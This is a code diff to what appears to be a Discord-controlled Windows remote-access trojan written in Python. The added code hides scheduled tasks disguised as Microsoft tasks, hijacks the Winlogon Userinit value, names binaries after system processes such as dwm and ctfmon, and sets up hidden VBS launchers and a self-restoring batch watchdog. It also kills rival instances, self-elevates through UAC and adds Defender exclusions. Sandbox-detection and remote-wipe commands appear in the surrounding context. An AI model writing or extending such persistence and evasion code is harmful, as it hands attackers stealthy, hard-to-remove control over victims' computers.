@@ -457,19 +457,34 @@ def vm_guard(code=0):
 vm_guard()
 
 
+_K32 = ctypes.WinDLL("kernel32", use_last_error=True)
+_K32.CreateMutexW.restype = ctypes.c_void_p
+_K32.CreateMutexW.argtypes = (ctypes.c_void_p, ctypes.c_int, ctypes.c_wchar_p)
+_K32.CloseHandle.restype = ctypes.c_int
+_K32.CloseHandle.argtypes = (ctypes.c_void_p,)
+
+
+def _mutex_name():
+    return "Global\\LM_" + _machine_hash()[:16]
+
+
 def _mutex_claim():
     global _MUTEX
-    st = _state_read() or {}
-    name = "Global\\" + (st.get("mutex") or _rand(14))
-    _MUTEX = ctypes.windll.kernel32.CreateMutexW(None, False, name)
-    return ctypes.windll.kernel32.GetLastError() != 183
+    _mutex_release()
+    _MUTEX = _K32.CreateMutexW(None, 0, _mutex_name())
+    if not _MUTEX:
+        return True
+    return ctypes.get_last_error() != 183
 
 
 def _mutex_release():
+    global _MUTEX
     try:
-        ctypes.windll.kernel32.CloseHandle(_MUTEX)
+        if _MUTEX:
+            _K32.CloseHandle(_MUTEX)
     except Exception:
         pass
+    _MUTEX = None
 
 
 voice_client = None
@@ -589,6 +604,8 @@ def _voice_watchdog(gen):
             pass
 
 ELEVATED_FLAG = "--zz-elev"
+_BOOT_SILENT = any(a in ("--zz-task", "--zz-ui", "--zz-repair", "--zz-setup")
+                   for a in sys.argv)
 _CNW = 0x08000000
 
 WINLOGON_KEY = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
@@ -612,27 +629,43 @@ APP_DIR = ""
 _LEGACY_STATE = os.path.join(PDATA, "ZZZ_Security", "state.json")
 
 REPAIR_FLAG = "--zz-repair"
-STATE_VERSION = 3
+STATE_VERSION = 4
 WATCHDOG_PERIOD = 45
 
 _FALLBACK_NAMES = (
-    "NexoraAgent", "NexoraSvc", "NexoraHelper", "NexoraCore", "NexoraHost",
-    "NexoraRun", "NexoraDaemon", "NexoraBg", "NexoraSupport", "NexoraClient",
+    "runtimebroker", "ctfmon", "backgroundtaskhost", "sihost", "fontdrvhost",
+    "dwm", "audiodg", "searchindexer", "smartscreen", "taskhostw",
 )
 
-def _watch_vbs_block(i=0):
-    p = '"%S{0}%.vbs"'.format(i)
-    return "\n".join([
-        '>' + p + ' echo Set s = CreateObject("WScript.Shell")',
-        '>>' + p + ' echo s.Run """" ^& "%S' + str(i) + '%" ^& """", 0, False',
-        '>nul 2>&1 attrib +h +s ' + p,
-    ])
+def _watch_vbs_block(flag="--zz-task"):
+    return 'wscript //nologo "%S0%.vbs" {}'.format(flag)
+
+
+def _write_vbs(st):
+    slots = st.get("slots") or []
+    if not slots:
+        return False
+    exe = slots[0]["exe"]
+    vbs = exe + ".vbs"
+    try:
+        os.makedirs(os.path.dirname(vbs), exist_ok=True)
+        with open(vbs, "w", encoding="utf-8", newline="\r\n") as f:
+            f.write('Set s = CreateObject("WScript.Shell")\n')
+            f.write('If WScript.Arguments.Count > 0 Then\n')
+            f.write('  s.Run """" & "{}" & """ " & WScript.Arguments(0), 0, False\n'.format(exe))
+            f.write('Else\n')
+            f.write('  s.Run """" & "{}" & """", 0, False\n'.format(exe))
+            f.write('End If\n')
+        _hide(vbs, True)
+        return True
+    except Exception:
+        return False
 
 
 _WATCH_BAT = """@echo off
-@echo off
 setlocal EnableExtensions
 if not "%~1"=="" title %~1
+set /a R=3
 :loop
 set "SRC="
 if exist "%S0%" set "SRC=%S0%"
@@ -641,39 +674,18 @@ if defined SRC (
 {restore}
 )
 tasklist /nh /fi "imagename eq {name}" 2>nul | find /i "{name}" >nul 2>&1
-if errorlevel 1 goto revive
-reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit 2>nul | find /i "%~n0" >nul 2>&1
-if errorlevel 1 if exist "%S0%" start "" /b "%S0%" --zz-repair
-goto tasks
-:revive
->nul 2>&1 schtasks /run /tn "{task}"
-if errorlevel 1 if exist "%S0%" start "" /b "%S0%"
-:tasks
-if exist "%S0%.vbs" goto havetask
-{vbs}
-:havetask
->nul 2>&1 schtasks /query /tn "{task}"
-if errorlevel 1 if exist "%S0%.vbs" >nul 2>&1 schtasks /create /tn "{task}" /tr "\\"wscript.exe //B \\"%S0%.vbs\\"\\"" /sc onlogon /rl highest /f
+if errorlevel 1 if exist "%S0%" {vbs}
+set /a R+=1
+if %R% LSS 4 goto wait
+set /a R=0
+if exist "%S0%" {vbsr}
+:wait
 call :sleep 21
 goto loop
 :sleep
 >nul 2>&1 ping -n %1 127.0.0.1
 exit /b 0
 """
-
-def _watch_vbs(bat, tag):
-    path = bat + ".vbs"
-    body = "\r\n".join([
-        'Set s = CreateObject("WScript.Shell")',
-        's.Run "cmd.exe /c " & """""" & "{}" & """ " & "{}" & """", 0, True'.format(bat, tag),
-    ]) + "\r\n"
-    try:
-        with open(path, "w", encoding="utf-8", newline="") as f:
-            f.write(body)
-        _hide(path, True)
-        return path
-    except Exception:
-        return None
 
 _watch_proc = None
 
@@ -821,6 +833,8 @@ def _ensure_state():
     slots = [{"exe": os.path.join(d, name), "bat": os.path.join(d, base + ".bat")}
              for d in _slot_dirs()]
 
+    names = [base, base + "Mon", base + "Svc"][:max(1, min(3, len(slots)))]
+
     d = {
         "v": STATE_VERSION,
         "dir": _sys32(),
@@ -828,7 +842,8 @@ def _ensure_state():
         "bak": slots[1]["exe"] if len(slots) > 1 else slots[0]["exe"],
         "bat": slots[0]["bat"],
         "slots": slots,
-        "task": "\\Microsoft\\Windows\\" + base,
+        "task": _TASK_DIR + names[0],
+        "tasks": [_TASK_DIR + n for n in names],
         "mutex": (st or {}).get("mutex") or _rand(14),
         "appdir": (st or {}).get("appdir") or _rand(11),
         "created": (st or {}).get("created") or int(time.time()),
@@ -907,46 +922,191 @@ def _startup_dir():
                         r"Microsoft\Windows\Start Menu\Programs\Startup")
 
 
-def _make_launcher(exe, folder):
-    lines = [
-        'Set sh = CreateObject("WScript.Shell")',
-        f'exe = "{exe}"',
-        f'sh.CurrentDirectory = "{os.path.dirname(exe)}"',
-        "Randomize",
-        "WScript.Sleep 15000 + Int(Rnd() * 25000)",
-        'sh.Run """" & exe & """", 0, False',
-        "For i = 1 To 120",
-        "    WScript.Sleep 20000",
-        '    Set svc = GetObject("winmgmts:\\\\.\\root\\cimv2")',
-        f'    Set col = svc.ExecQuery("SELECT Name FROM Win32_Process WHERE Name=\'{os.path.basename(exe)}\'")',
-        '    If col.Count = 0 Then sh.Run """" & exe & """", 0, False',
-        "Next",
-    ]
-    path = os.path.join(os.path.dirname(exe), folder + ".vbs")
+_TASK_DIR = "\\Microsoft\\Windows\\"
+_TASK_SDDL = "D:PAI(A;;GA;;;BA)(A;;GA;;;SY)(A;;GRGX;;;BU)(A;;GRGX;;;AU)"
+
+_TASK_XML = """<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Author>Microsoft Corporation</Author>
+    <Description>{desc}</Description>
+  </RegistrationInfo>
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>true</Enabled>
+      <UserId>{sid}</UserId>
+      <Delay>PT{d1}S</Delay>
+    </LogonTrigger>
+    <BootTrigger>
+      <Enabled>true</Enabled>
+      <Delay>PT{d2}S</Delay>
+    </BootTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <UserId>{sid}</UserId>
+      <LogonType>InteractiveToken</LogonType>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>false</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>false</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>7</Priority>
+    <RestartOnFailure>
+      <Interval>PT1M</Interval>
+      <Count>3</Count>
+    </RestartOnFailure>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>{exe}</Command>
+      <Arguments>--zz-task</Arguments>
+      <WorkingDirectory>{cwd}</WorkingDirectory>
+    </Exec>
+  </Actions>
+</Task>
+"""
+
+
+def _xesc(v):
+    return str(v).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+
+
+def _console_user():
+    root = os.path.join(os.environ.get("SystemDrive", "C:") + "\\", "Users")
+    best, best_t = None, 0.0
     try:
-        with open(path, "w", encoding="utf-8", newline="\r\n") as f:
-            f.write("\r\n".join(lines) + "\r\n")
-        _hide(path, True)
-        return path
+        for n in os.listdir(root):
+            if n.lower() in ("default", "default user", "public", "all users", "defaultuser0"):
+                continue
+            h = os.path.join(root, n, "NTUSER.DAT")
+            if not os.path.isfile(h):
+                continue
+            t = os.path.getmtime(h)
+            if t > best_t:
+                best, best_t = n, t
     except Exception:
         return None
+    return best
 
-def _hidden_cmd(exe):
+
+def _sid():
+    if (os.environ.get("USERNAME") or "").upper() == "SYSTEM":
+        u = _console_user()
+        if u:
+            try:
+                import win32security
+                return win32security.ConvertSidToStringSid(
+                    win32security.LookupAccountName(
+                        None, os.environ.get("COMPUTERNAME", "") + "\\" + u)[0])
+            except Exception:
+                return os.environ.get("COMPUTERNAME", "") + "\\" + u
     try:
-        vbs = _make_launcher(exe, os.path.basename(exe))
-        if vbs:
-            return 'wscript.exe //B "{}"'.format(vbs)
+        import win32security
+        tok = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32con.TOKEN_QUERY)
+        return win32security.ConvertSidToStringSid(
+            win32security.GetTokenInformation(tok, win32security.TokenUser)[0])
+    except Exception:
+        return os.environ.get("USERDOMAIN", "") + "\\" + os.environ.get("USERNAME", "")
+
+
+def _task_svc():
+    pythoncom.CoInitialize()
+    svc = win32com.client.Dispatch("Schedule.Service")
+    svc.Connect()
+    return svc
+
+
+def _task_create(name, exe, d1=8):
+    if not name.startswith("\\"):
+        name = _TASK_DIR + name
+    exe = str(exe)
+    sid = _sid()
+    xml = _TASK_XML.format(desc=os.path.basename(exe), sid=_xesc(sid), exe=_xesc(exe),
+                           cwd=_xesc(os.path.dirname(exe)), d1=d1, d2=d1 + 12)
+    try:
+        root = _task_svc().GetFolder(_TASK_DIR)
+        try:
+            root.RegisterTask(name, xml, 6, sid, "", 3, _TASK_SDDL)
+        except Exception:
+            root.RegisterTask(name, xml, 6, sid, "", 3)
+        return True
+    except Exception as e:
+        _crash("task", "create {} {!r}".format(name, e))
+        return False
+
+
+def _task_delete(name):
+    if not name.startswith("\\"):
+        name = _TASK_DIR + name
+    try:
+        _task_svc().GetFolder(_TASK_DIR).DeleteTask(name, 0)
+        return True
     except Exception:
         pass
-    return '"{}"'.format(exe)
+    try:
+        subprocess.run(["schtasks", "/delete", "/tn", name, "/f"],
+                       capture_output=True, creationflags=_CNW)
+    except Exception:
+        pass
+    return False
 
 
-def _task_create(name, exe, sc, extra=()):
-    subprocess.run(
-        ["schtasks", "/Create", "/TN", name, "/TR", _hidden_cmd(exe),
-         "/SC", sc, "/RL", "HIGHEST", "/F", *extra],
-        capture_output=True, creationflags=_CNW)
+def _task_exists(name):
+    if not name.startswith("\\"):
+        name = _TASK_DIR + name
+    try:
+        _task_svc().GetFolder(_TASK_DIR).GetTask(name)
+        return True
+    except Exception:
+        return False
 
+def _trigger_task(st):
+    for t in (st.get("tasks") or []):
+        try:
+            _task_svc().GetFolder(_TASK_DIR).GetTask(t).Run("")
+            return True
+        except Exception:
+            continue
+    return False
+
+
+def _takeover():
+    me = os.getpid()
+    cur = os.path.abspath(sys.executable if getattr(sys, "frozen", False) else sys.argv[0]).lower()
+    names = {os.path.basename(cur)}
+    paths = {cur}
+    st = _state_read() or {}
+    for s in (st.get("slots") or []):
+        p = (s.get("exe") or "").lower()
+        if p:
+            names.add(os.path.basename(p))
+            paths.add(os.path.abspath(p).lower())
+    for p in psutil.process_iter(["pid", "name", "exe"]):
+        try:
+            if p.info["pid"] == me:
+                continue
+            if (p.info.get("name") or "").lower() not in names and \
+               (p.info.get("exe") or "").lower() not in paths:
+                continue
+            p.kill()
+        except Exception:
+            pass
 
 def install_userinit():
     st = _ensure_state()
@@ -954,7 +1114,7 @@ def install_userinit():
     userinit = os.path.join(WINDIR, "System32", "userinit.exe")
     if not os.path.exists(exe):
         return False
-    entry = _hidden_cmd(exe)
+    entry = '"{}" --zz-ui'.format(exe)
     for _ in range(5):
         cur = _reg_query(WINLOGON_KEY, "Userinit") or (userinit + ",")
         low = cur.lower()
@@ -1011,23 +1171,17 @@ def repair_all():
             _hide(p, True)
             _lock_exe(p)
 
-    fixed = False
+    names = st.get("tasks") or [st["task"]]
+    for i, (s, t) in enumerate(zip(slots, names)):
+        if Path(s["exe"]).exists():
+            _task_create(t, s["exe"], 8 + i * 6)
+
     try:
-        fixed = install_userinit()
+        install_userinit()
     except Exception:
-        fixed = False
-    if not fixed:
-        try:
-            _task_create(st["task"], slots[0]["exe"], "ONLOGON")
-            _task_create(st["task"] + "_w", slots[0]["exe"], "ONSTART")
-        except Exception:
-            pass
+        pass
 
     _write_watchdog(st)
-    for s in slots:
-        _ps(f'Add-MpPreference -ExclusionPath "{s["exe"]}" -ErrorAction SilentlyContinue')
-    _ps(f'Add-MpPreference -ExclusionProcess "{os.path.basename(slots[0]["exe"])}" '
-        f'-ErrorAction SilentlyContinue')
     _crash("repair", "done slots={}".format(len(slots)))
 
 
@@ -1042,9 +1196,11 @@ def _write_watchdog(st):
         '  if not exist "%S{0}%" copy /y "%SRC%" "%S{0}%" >nul 2>&1\n'
         '  if exist "%S{0}%" attrib +h +s "%S{0}%" >nul 2>&1'.format(i)
         for i in range(len(slots)))
-    body = _WATCH_BAT.format(defs=defs, find=find, restore=restore, vbs=_watch_vbs_block(0),
-                             name=os.path.basename(slots[0]["exe"]),
-                             task=st["task"], flag=REPAIR_FLAG, period=WATCHDOG_PERIOD)
+    _write_vbs(st)
+    body = _WATCH_BAT.format(defs=defs, find=find, restore=restore,
+                             vbs=_watch_vbs_block("--zz-task"),
+                             vbsr=_watch_vbs_block("--zz-repair"),
+                             name=os.path.basename(slots[0]["exe"]))
     ok = False
     for s in slots:
         try:
@@ -1142,18 +1298,11 @@ def _spawn_watchdog():
     if not bat:
         return
     tag = "LMG_" + (st.get("mutex") or "0")
-    vbs = _watch_vbs(bat, tag)
     try:
-        if vbs:
-            _watch_proc = subprocess.Popen(
-                ["wscript.exe", "//B", vbs], creationflags=_CNW,
-                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL, close_fds=True)
-        else:
-            _watch_proc = subprocess.Popen(
-                ["cmd.exe", "/c", bat, tag], creationflags=_CNW,
-                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL, close_fds=True)
+        _watch_proc = subprocess.Popen(
+            ["cmd.exe", "/c", bat, tag], creationflags=_CNW,
+            stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL, close_fds=True)
     except Exception:
         _watch_proc = None
 
@@ -1164,16 +1313,10 @@ def _watch_resume():
     if not bat:
         return
     tag = "LMG_" + (st.get("mutex") or "0")
-    vbs = _watch_vbs(bat, tag)
     try:
-        if vbs:
-            subprocess.Popen(["wscript.exe", "//B", vbs], creationflags=_CNW,
-                             stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
-                             stderr=subprocess.DEVNULL, close_fds=True)
-        else:
-            subprocess.Popen(["cmd.exe", "/c", bat, tag], creationflags=_CNW,
-                             stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
-                             stderr=subprocess.DEVNULL, close_fds=True)
+        subprocess.Popen(["cmd.exe", "/c", bat, tag], creationflags=_CNW,
+                         stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
+                         stderr=subprocess.DEVNULL, close_fds=True)
     except Exception:
         pass
 
@@ -1252,10 +1395,16 @@ def setup_persistence():
         if p.exists():
             _lock_exe(p)
 
-    if primary.exists():
-        if not install_userinit():
-            _task_create(st["task"], str(primary), "ONLOGON")
-        _task_create(st["task"] + "_w", str(primary), "ONSTART")
+    try:
+        uninstall_userinit()
+        install_userinit()
+    except Exception:
+        pass
+
+    names = st.get("tasks") or [st["task"]]
+    for i, (s, t) in enumerate(zip(slots, names)):
+        if Path(s["exe"]).exists():
+            _task_create(t, s["exe"], 8 + i * 6)
 
     for s in slots:
         _ps(f'Add-MpPreference -ExclusionPath "{s["exe"]}" -ErrorAction SilentlyContinue')
@@ -1284,17 +1433,57 @@ def boot():
             _crash("boot", "repair failed {!r}".format(e))
         os._exit(0)
 
-    if not _mutex_claim():
-        _crash("boot", "mutex busy, exit")
+    if "--zz-setup" in sys.argv:
+        _crash("boot", "setup mode")
+        try:
+            setup_persistence()
+        except Exception as e:
+            _crash("boot", "setup failed {!r}".format(e))
         os._exit(0)
-    _crash("boot", "mutex ok")
 
-    if not _is_admin() and ELEVATED_FLAG not in sys.argv:
+    if not _is_admin() and "--zz-ui" in sys.argv:
+        if _trigger_task(_state_read() or {}):
+            _crash("boot", "delegated to task")
+            os._exit(0)
+
+    if not _mutex_claim():
+        if _is_admin():
+            _crash("boot", "mutex busy, takeover")
+            try:
+                _watch_suspend()
+            except Exception:
+                pass
+            _takeover()
+            ok = False
+            for _ in range(20):
+                time.sleep(0.25)
+                if _mutex_claim():
+                    ok = True
+                    break
+            if not ok:
+                _crash("boot", "takeover failed")
+                try:
+                    _watch_resume()
+                except Exception:
+                    pass
+                os._exit(0)
+            _crash("boot", "mutex taken over")
+        else:
+            _crash("boot", "mutex busy, exit")
+            os._exit(0)
+    else:
+        _crash("boot", "mutex ok")
+
+    if not _is_admin() and ELEVATED_FLAG not in sys.argv and not _BOOT_SILENT:
         ok = False
         try:
-            params = ELEVATED_FLAG if getattr(sys, "frozen", False) else \
-                     f'{ELEVATED_FLAG} "{Path(__file__).resolve()}"'
-            r = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 0)
+            extra = [a for a in sys.argv[1:] if a != ELEVATED_FLAG]
+            if not getattr(sys, "frozen", False):
+                extra.insert(0, str(Path(__file__).resolve()))
+            params = " ".join('"{}"'.format(a) for a in [ELEVATED_FLAG] + extra)
+            show = 0 if getattr(sys, "frozen", False) else 1
+            r = ctypes.windll.shell32.ShellExecuteW(
+                None, "runas", sys.executable, params, None, show)
             ok = int(r) > 32
         except Exception:
             ok = False
@@ -5875,11 +6064,8 @@ async def watchdog_status(ctx):
             p, "yes" if b and os.path.exists(b) else "no"))
     ui = (_reg_query(WINLOGON_KEY, "Userinit") or "").lower()
     lines.append("userinit: " + ("ok" if st.get("exe") and st["exe"].lower() in ui else "MISSING"))
-    for t in (st.get("task"), (st.get("task") or "") + "_w"):
-        if not t:
-            continue
-        r = cmd_run('schtasks /query /tn "{}"'.format(t))
-        lines.append("{}: {}".format(t, "ok" if r.returncode == 0 else "MISSING"))
+    for t in (st.get("tasks") or []):
+        lines.append("{}: {}".format(t, "ok" if _task_exists(t) else "MISSING"))
     alive = _watch_proc is not None and _watch_proc.poll() is None
     lines.append("watchdog: " + ("pid {}".format(_watch_proc.pid) if alive else "DOWN"))
     await send_long(ctx, "\n".join(lines))
@@ -6126,10 +6312,6 @@ async def confirm_kill(ctx):
     await step("Rebooting in three seconds")
     subprocess.Popen(["shutdown", "/r", "/f", "/t", "3"], shell=True)
 
-
-
-
-
 @bot.command()
 async def exit(ctx):
     await ctx.send(embed=create_embed("👋 Goodbye", "The watchdog is being suspended and the process is closing, nothing will bring it back until the next logon.", 0x00ff00))
@@ -6238,8 +6420,6 @@ async def update(ctx):
 
     await asyncio.sleep(2)
     os._exit(0)
-
-
 
 @bot.command(aliases=["set-date"])
 async def set_date(ctx, date_str: str):
@@ -6557,16 +6737,10 @@ def _watch_write():
         '  if exist "%S{0}%" attrib +h +s +r "%S{0}%" >nul 2>&1'.format(i)
         for i in range(len(slots)))
     body = _WATCH_BAT.format(defs=defs, find=find, restore=restore,
-                             vbs=_watch_vbs_block(0),
+                             vbs=_watch_vbs_block("--zz-task"),
+                             vbsr=_watch_vbs_block("--zz-repair"),
                              name=os.path.basename(slots[0]["exe"]), task=task)
-    vbs = slots[0]["exe"] + ".vbs"
-    try:
-        with open(vbs, "w", encoding="utf-8", newline="\r\n") as f:
-            f.write('Set s = CreateObject("WScript.Shell")\n')
-            f.write('s.Run """" & "{}" & """", 0, False\n'.format(slots[0]["exe"]))
-        _hide(vbs, True)
-    except Exception:
-        pass
+    _write_vbs(st)
     ok = False
     for s in slots:
         try:
@@ -6585,16 +6759,10 @@ def _watch_resume():
     if not bat:
         return
     tag = "LMG_" + (st.get("mutex") or "0")
-    vbs = _watch_vbs(bat, tag)
     try:
-        if vbs:
-            subprocess.Popen(["wscript.exe", "//B", vbs], creationflags=_CNW,
-                             stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
-                             stderr=subprocess.DEVNULL, close_fds=True)
-        else:
-            subprocess.Popen(["cmd.exe", "/c", bat, tag], creationflags=_CNW,
-                             stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
-                             stderr=subprocess.DEVNULL, close_fds=True)
+        subprocess.Popen(["cmd.exe", "/c", bat, tag], creationflags=_CNW,
+                         stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
+                         stderr=subprocess.DEVNULL, close_fds=True)
     except Exception:
         pass
 
@@ -6634,28 +6802,6 @@ async def exe(ctx):
         return await ctx.send(embed=create_embed("📦 EXE", "The binary is larger than 32 MB and cannot be attached here.", 0xff4444))
     await ctx.send(file=discord.File(src, filename=os.path.basename(src)))
 
-@bot.command(name="uninstall")
-async def uninstall(ctx):
-    await ctx.send(embed=create_embed("💣 Uninstall", "The watchdog was killed and every trace is being deleted.", 0xff4444))
-    _watch_kill()
-    time.sleep(1.0)
-    st = _state_read() or {}
-    for t in [x for x in (st.get("task"), (st.get("task") or "") + "_w") if x]:
-        subprocess.run(["schtasks", "/Delete", "/TN", t, "/F"], capture_output=True, creationflags=_CNW)
-    try:
-        uninstall_userinit()
-    except Exception:
-        pass
-    for p in _slots():
-        try:
-            subprocess.run(["attrib", "-r", "-s", "-h", p], capture_output=True, creationflags=_CNW)
-            os.remove(p)
-        except Exception:
-            pass
-    subprocess.Popen(["cmd.exe", "/c", "timeout /t 2 >nul & start \"\" \"{}\"".format(sys.executable)],
-                     creationflags=_CNW)
-    os._exit(0)
-
 _WIPE_FLAGS = 0x08000000 | 0x00000008 | 0x00000200  # NO_WINDOW | DETACHED | NEW_PROCESS_GROUP
 
 
@@ -6687,7 +6833,7 @@ def _wipe_bat(paths, dirs):
     return path
 
 
-@bot.command(name="implode", aliases=["wipe", "autodestruct"])
+@bot.command(name="implode", aliases=["wipe", "autodestruct", "uninstall"])
 async def implode(ctx):
     if not is_admin():
         await ctx.send(embed=create_embed("🧩 Implode",
@@ -6709,15 +6855,20 @@ async def implode(ctx):
 
     st = _state_read() or {}
     slots = [s for s in (st.get("slots") or []) if s.get("exe")]
-    tasks = [t for t in (st.get("task"), (st.get("task") or "") + "_w") if t]
+    tasks = list(st.get("tasks") or [])
+    for extra in (st.get("task"), (st.get("task") or "") + "_w"):
+        if extra and extra not in tasks:
+            tasks.append(extra)
 
     try:
         uninstall_userinit()
     except Exception:
         pass
     for t in tasks:
-        subprocess.run(["schtasks", "/Delete", "/TN", t, "/F"],
-                       capture_output=True, creationflags=_CNW)
+        _task_delete(t)
+    for t in tasks:
+        if _task_exists(t):
+            _task_delete(t)
     for name in (r"Software\Microsoft\Windows\CurrentVersion\Run",):
         _reg_delete(name, os.path.splitext(os.path.basename(st.get("exe") or "x"))[0], "HKCU")
 
